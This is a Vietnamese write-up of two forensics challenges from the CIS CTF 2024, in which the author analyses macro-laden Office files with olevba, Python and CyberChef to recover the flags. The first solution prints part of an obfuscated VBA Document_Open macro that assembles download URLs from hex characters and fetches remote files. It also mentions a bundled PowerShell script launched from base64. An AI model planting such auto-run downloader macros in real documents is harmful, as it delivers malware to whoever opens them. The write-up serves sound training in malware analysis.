--- 
title: "CIS CTF"
date: 2024-09-30T17:31:45+07:00
tags: [Forensics]
author: [1]
---

Đây là năm đầu tiên CIS được tổ chức. Mình khá hào hứng khi tham gia giải này, vừa cả sợ không làm được bài, vì toàn các đối thủ mạnh thôi. Đây cũng là một cơ hội để mình có ý chí cố gắng hơn, để giỏi hơn nữa. Trong 4 bài Forensics mình chỉ làm được 2 bài. Cảm ơn mọi người đã đọc. Giờ thì bắt đầu thôi.

## 1. sexe.zip
> Tiếc diên năm 2024, tui đang ở trên toà Phao-sần-palây, tui thấy 1 hiện tượng lạ, có hình có trái tim, có tình iu. Mà tui nói với quý dị là tui mắt thấy tai nghe chứ khum có nằm chiêm bao. Tui thấy một người phụ nữ điẹp thật điẹp, s.exe Flag có 2 phần: Phần thứ nhất nằm trong hình ảnh, phần thứ 2 nằm trong link.

> Pass zip: cis2024

### Solution
Bài cho mình 1 file zip và password. Mình unzip file zip và nhận được 1 file eml. Mình dùng trình đọc online, thấy nó chứa 1 file đính kèm và có cả mật khẩu :
![image](https://hackmd.io/_uploads/BkIivjFyJl.png)
Down file zip xuống và extract bằng pass đã cho. Dùng olevba check macro, vì code khá dài nên mình chỉ nói đến hàm chính:
```vbs=
Private Sub Document_Open()
Dim targetFileName As String
targetFileName = "sexe.docm"
If ThisDocument.Name = targetFileName Then
On Error Resume Next
Dim YjB As Variant
MjqZthLra
YjB = ZvyJxkrbxq()
Dim i As Integer
Dim x18927312q As String
Dim ykajsy98q9 As String
Dim z918273aqw As String
Dim w128737921 As String
Dim o888q87w66 As String
Dim q918273912 As String
Dim A120382103 As String
Dim B817263893 As String
Dim C098q0w812 As String
Dim D98128703a As String
Dim Eoiaoq9098 As String
A = ChrW(&H68) & ChrW(&H74) & ChrW(&H74) & ChrW(&H70) &
ChrW(&H3A) & ChrW(&H2F) & ChrW(&H2F) & ChrW(&H31) & ChrW(&H39) &
ChrW(&H32) & ChrW(&H2E) & ChrW(&H31) & ChrW(&H36) & ChrW(&H38) &
ChrW(&H2E) & ChrW(&H35) & ChrW(&H36) & ChrW(&H2E) & ChrW(&H31) &
ChrW(&H3A) & ChrW(&H38) & ChrW(&H30) & ChrW(&H38) & ChrW(&H31) &
ChrW(&H2F)
x18927312q = ChrW(&H68) & ChrW(&H74) & ChrW(&H74) & ChrW(&H70) &
ChrW(&H73) & ChrW(&H3A) & ChrW(&H2F) & ChrW(&H2F)
A120382103 =
"687474703A2F2F6578616D706C652E636F6D2F66616B653120"
ykajsy98q9 = ChrW(&H67) & ChrW(&H69) & ChrW(&H74) & ChrW(&H68) &
ChrW(&H75) & ChrW(&H62) & ChrW(&H2E) & ChrW(&H63)
z918273aqw = ChrW(&H6F) & ChrW(&H6D) & ChrW(&H2F) & ChrW(&H30) &
ChrW(&H78) & ChrW(&H4B) & ChrW(&H43) & ChrW(&H53)
w128737921 = ChrW(&H43) & ChrW(&H2F) & ChrW(&H64) & ChrW(&H65) &
ChrW(&H6D) & ChrW(&H6F) & ChrW(&H2D) & ChrW(&H6F)
o888q87w66 = ChrW(&H6E) & ChrW(&H6C) & ChrW(&H79) & ChrW(&H2F) &
ChrW(&H72) & ChrW(&H61) & ChrW(&H77) & ChrW(&H2F)
q918273912 = ChrW(&H6D) & ChrW(&H61) & ChrW(&H69) & ChrW(&H6E) &
ChrW(&H2F)
For i = 1 To 98
HxvRibfksk (x18927312q & ykajsy98q9 & z918273aqw & w128737921 &
o888q87w66 & q918273912 & YjB(i))
Next i
JkYpCwv
On Error GoTo 0
End If
End Sub
```
Mình chuyển một số hàm thành Python xem nó ra cái gì:
```python=
A = (
chr(0x68) + chr(0x74) + chr(0x74) + chr(0x70) + chr(0x73) + chr(0x3A) +
chr(0x2F) + chr(0x2F) +
chr(0x67) + chr(0x69) + chr(0x74) + chr(0x68) + chr(0x75) + chr(0x62) +
chr(0x2E) + chr(0x63) +
chr(0x6F) + chr(0x6D) + chr(0x2F) + chr(0x30) + chr(0x78) + chr(0x4B) +
chr(0x43) + chr(0x53) +
chr(0x43) + chr(0x2F) + chr(0x64) + chr(0x65) + chr(0x6D) + chr(0x6F) +
chr(0x2D) + chr(0x6F) +
chr(0x6E) + chr(0x6C) + chr(0x79) + chr(0x2F) + chr(0x72) + chr(0x61) +
chr(0x77) + chr(0x2F) +
chr(0x6D) + chr(0x61) + chr(0x69) + chr(0x6E) + chr(0x2F)
)
print(A)
```
Và nhận được đầu ra là 1 liên kết: https://github.com/0xKCSC/demo-only/raw/main/.
![image](https://hackmd.io/_uploads/By0ldsYJke.png)
Ở đường dẫn demo-only, mình thấy có khá nhiều file có đuôi godefend. Mình clone
nó về. Sau đó dùng lệnh `ls -lh` để kiểm tra dung lượng file. Các file có dung lượng
khác lần lượt là 22, 32 và 33. Ở file 22, mình có được phần đầu của flag:
![Screenshot 2024-10-14 030644-min](https://hackmd.io/_uploads/SkYZKiKJye.png)
Với các file 32 và 33. Mình dùng Detect-it-easy để xem nó là gì vì dung lượng nó khá thấp.
![image](https://hackmd.io/_uploads/S1lEFjFk1e.png)
Dùng Jetbrains Dotpeak load nó vào vì đây là 1 file C#:
![image](https://hackmd.io/_uploads/HyUBtit1kl.png)
Trong phần Resources, mình thấy 1 file mal.ps1. Các lệnh có thể khá phức tạp, tuy nhiên ta chỉ cần để ý đến phần `Start-Process -NoNewWindow powershell`. Copy đoạn base64, đưa nó vào Cyberchef:
![image](https://hackmd.io/_uploads/B1kdYiYJJx.png)
Mình thử copy link và search nhưng không thành công. Sau đó mình đếm và biết được phần còn thiếu là 10 kí tự. Đúng với chữ p0wershe1l trong link. Chỉ cần dán vào phần đầu và lụm cờ.

FLAG: `CIS{sexy_h0ney_p0wershe1l}`

## 2. Tin học văn phòng 2
> It's actually `Tin học văn phòng 3`

### Solution
Đề bài cho mình 1 file doc. Như thường lệ, mình dùng olevba để check macro.
![image](https://hackmd.io/_uploads/rkaCYjtyke.png)
Đây là một phần của đoạn mã, vì nó khá là dài nên mình không copy ra đây hết
được. Ban đầu mình stuck khoảng gần 1 nửa thời gian, loanh quanh xem từng hàm
một. Sau đó mình bắt đầu để ý đến các hàm được comment, đặc biệt là các dòng
chứa từ LitStr, khi nối chúng lại và decode bằng base64 ta sẽ được 1 chuỗi có
nghĩa. Mình extract olevba ra 1 file có tên out.txt, sau đó dùng lệnh `cat out.txt | grep
"LitStr"` để lọc ra các dòng chứa từ LitStr. Để ý tiếp :
![image](https://hackmd.io/_uploads/SkmW5iFJye.png)
Mình thấy các dòng chứa 0x0004 là nhiều nhất. Nên mình dùng cách tương tự để lấy ra các dòng chứa 0x0004. Sau đó mình dùng VScode loại bỏ các từ không cần thiết. Sau đó vứt nó vào Cyberchef:
![image](https://hackmd.io/_uploads/SJKfqsFJkg.png)
Mình nhận được cờ ở đây.

FLAG: `CIS2024{Tin_hoc_van_phong_neva_die}`

Và chỉ có như vậy thôi!!!!!

![i-love-you-pepe](https://hackmd.io/_uploads/ByS4G0gmkg.gif)



